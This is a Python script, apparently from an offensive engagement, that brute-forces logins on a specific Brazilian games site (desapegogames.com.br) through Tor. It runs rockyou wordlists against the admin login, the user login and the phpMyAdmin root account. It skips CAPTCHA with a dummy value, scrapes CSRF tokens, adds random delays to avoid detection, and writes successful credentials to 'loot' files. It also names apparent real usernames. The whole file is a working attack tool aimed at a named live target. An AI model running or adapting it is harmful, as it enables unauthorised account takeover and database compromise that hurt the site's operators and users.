#!/usr/bin/env python3
"""
PIVOT RODADA 2 — Brute force robusto via Tor com retry.
Oraculo F-021: body SEM 'confere' = cred CORRETA (admin).
Login F-014: HTTP 302/303 ou body sem 'nao confere' = success (/login).
"""
import sys, time, random, requests, urllib3, re, os
from datetime import datetime, timezone
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
TIMEOUT=60
MAX_RETRIES=3

def load_wl(path):
    with open(path,encoding="utf-8",errors="replace") as f:
        return [l.rstrip("\n") for l in f if l.strip()]

def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def req_retry(sess, method, url, **kw):
    for attempt in range(MAX_RETRIES):
        try:
            r = sess.request(method, url, verify=False, timeout=TIMEOUT, proxies=PROXY, **kw)
            return r
        except Exception as e:
            if attempt < MAX_RETRIES-1:
                time.sleep(5*(attempt+1))
                continue
            raise

def admin_oracle(users, pws, outpath):
    URL="https://186.226.60.54/admin/autenticacao/login"
    f=open(outpath,"a")
    def log(m):
        line=f"{ts()} {m}"; print(line,flush=True); f.write(line+"\n"); f.flush()
    log(f"[*] PIVOT admin oracle rockyou — {len(users)} users x {len(pws)} = {len(users)*len(pws)}")
    tried=0; hits=[]
    for user in users:
        for pw in pws:
            tried+=1
            sess=requests.Session()
            try:
                r=req_retry(sess,"POST",URL,headers={"Host":HOSTH,"User-Agent":UA},
                    data={"login":user,"senha":pw,"g-recaptcha-response":"DUMMY"},
                    allow_redirects=False)
                body=r.content
                confere=b"confere" in body
                if not confere:
                    log(f"  [{tried:05d}] *** ORACULO+ *** {user!r}:{pw!r} HTTP {r.status_code}")
                    hits.append((user,pw))
                elif tried%50==0:
                    log(f"  [{tried:05d}] {user!r}:{pw!r} WRONG HTTP {r.status_code}")
            except Exception as e:
                log(f"  [{tried:05d}] {user!r}:{pw!r} EXC {type(e).__name__} (retry)")
            time.sleep(random.uniform(2,3))
    log(f"\n=== RESULT admin oracle: {len(hits)} hits / {tried} ===")
    for u,p in hits: log(f"  HIT {u}:{p}")
    if hits:
        with open("loot/admin_creds_rockyou.txt","w") as lf:
            for u,p in hits: lf.write(f"{u}:{p}\n")
    f.close()

def login_stuff(users, pws, outpath):
    URL="https://186.226.60.54/login"
    f=open(outpath,"a")
    def log(m):
        line=f"{ts()} {m}"; print(line,flush=True); f.write(line+"\n"); f.flush()
    log(f"[*] PIVOT /login credstuff rockyou — {len(users)} users x {len(pws)} = {len(users)*len(pws)}")
    tried=0; hits=[]
    for user in users:
        for pw in pws:
            tried+=1
            sess=requests.Session()
            try:
                r=req_retry(sess,"POST",URL,headers={"Host":HOSTH,"User-Agent":UA},
                    data={"login":user,"senha":pw},allow_redirects=False)
                body=r.content
                fail=b"confere" in body
                loc=r.headers.get("Location","")
                ck="ci_session" in r.headers.get("Set-Cookie","")
                success=(r.status_code in (301,302,303,307)) or (r.status_code==200 and not fail and b"painel" in body.lower())
                if success:
                    log(f"  [{tried:05d}] *** SUCCESS *** {user!r}:{pw!r} HTTP {r.status_code} loc={loc} ck={ck}")
                    hits.append((user,pw))
                elif tried%50==0:
                    log(f"  [{tried:05d}] {user!r}:{pw!r} FAIL HTTP {r.status_code}")
            except Exception as e:
                log(f"  [{tried:05d}] {user!r}:{pw!r} EXC {type(e).__name__} (retry)")
            time.sleep(random.uniform(1.5,2.5))
    log(f"\n=== RESULT login: {len(hits)} hits / {tried} ===")
    for u,p in hits: log(f"  HIT {u}:{p}")
    if hits:
        with open("loot/login_creds_rockyou.txt","w") as lf:
            for u,p in hits: lf.write(f"{u}:{p}\n")
    f.close()

def pma_stuff(pws, outpath):
    BASE="https://186.226.60.54/phpMyAdmin/"
    f=open(outpath,"a")
    def log(m):
        line=f"{ts()} {m}"; print(line,flush=True); f.write(line+"\n"); f.flush()
    log(f"[*] PIVOT pma root rockyou top500 — {len(pws)} senhas")
    tried=0; hits=[]
    for pw in pws:
        tried+=1
        sess=requests.Session()
        try:
            r0=req_retry(sess,"GET",BASE,headers={"Host":HOSTH,"User-Agent":UA})
            m=re.search(r'name="token"\s+value="([^"]+)"',r0.text)
            if not m:
                log(f"  [{tried:04d}] no token"); time.sleep(2); continue
            token=m.group(1)
            ss=re.search(r'name="set_session"\s+value="([^"]+)"',r0.text)
            ss=ss.group(1) if ss else ""
            r=req_retry(sess,"POST",BASE+"index.php",
                headers={"Host":HOSTH,"User-Agent":UA,"Content-Type":"application/x-www-form-urlencoded","Referer":BASE},
                data={"set_session":ss,"pma_username":"root","pma_password":pw,"server":"1","token":token},
                allow_redirects=False)
            body=r.content
            form=b'name="pma_username"' in body
            denied=b"Access denied" in body or b"Cannot log" in body
            loc=r.headers.get("Location","")
            success=(r.status_code in (301,302,303) and "index.php" in loc) or (r.status_code==200 and not form and not denied and b"navigation" in body.lower())
            if success:
                log(f"  [{tried:04d}] *** SUCCESS *** root:{pw!r} HTTP {r.status_code} loc={loc}")
                hits.append(("root",pw))
            elif tried%50==0:
                log(f"  [{tried:04d}] root:{pw!r} FAIL HTTP {r.status_code}")
        except Exception as e:
            log(f"  [{tried:04d}] root:{pw!r} EXC {type(e).__name__} (retry)")
        time.sleep(random.uniform(2,3))
    log(f"\n=== RESULT pma: {len(hits)} hits / {tried} ===")
    for u,p in hits: log(f"  HIT {u}:{p}")
    if hits:
        with open("loot/pma_creds_rockyou.txt","w") as lf:
            for u,p in hits: lf.write(f"{u}:{p}\n")
    f.close()

if __name__=="__main__":
    mode=sys.argv[1] if len(sys.argv)>1 else "admin"
    wlp="/tmp/opencode/pivot/rockyou_top1000.txt"
    if mode=="pma":
        wlp="/tmp/opencode/pivot/rockyou_top500.txt"
    pws=load_wl(wlp)
    os.makedirs("loot",exist_ok=True)
    if mode=="admin":
        users=["administrador","adminv","dev1ce","devaashe","masterx","admin","root",
               "diego","diegobtrindade","desapegogames","suporte","master"]
        admin_oracle(users,pws,"enum/pivot_admin_oracle_rockyou.log")
    elif mode=="login":
        users=["administrador","adminv","dev1ce","devaashe","masterx","diegobtrindade",
               "desapegostore","diego047","comercial"]
        login_stuff(users,pws,"enum/pivot_login_credstuff_rockyou.log")
    elif mode=="pma":
        pma_stuff(pws,"enum/pivot_pma_rockyou.log")
